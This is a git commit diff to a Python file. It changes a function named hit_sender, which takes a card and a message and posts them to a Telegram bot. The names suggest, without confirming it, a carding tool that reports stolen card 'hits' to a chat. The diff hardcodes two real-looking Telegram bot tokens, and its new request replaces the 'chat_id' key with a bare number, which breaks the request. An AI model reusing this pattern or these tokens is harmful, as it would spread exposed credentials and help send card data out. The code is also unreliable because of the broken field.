7896e1db0890dca54f305baed3316bd5265b015a
Awmtea Polythene <omomacck@yahoo.com>
2025-01-16 23:03:42 +0530

    Update extra.py

--- extra.py
+++ extra.py
@@ -1,7 +1,7 @@
 import requests
 
 def hit_sender(card,message,chat_id):
-    bot_token = '5119865265:AAGo4fCkoRE9J2oXk6Yt7wVwLOo'
-    url = f'https://api.telegram.org/bot{bot_token}/sendMessage'
-    data = {'chat_id': chat_id, 'text': message}
+    bot_token = '7740237222:AAEUJJBK7iLOMYTsox9epp7iG2unPQvYXmY'
+    url = f'https://api.telegram.org/bot7740237222:AAEUJJBK7iLOMYTsox9epp7iG2unPQvYXmY/sendMessage'
+    data = {'7237320756': chat_id, 'text': message}
     requests.post(url, data=data)
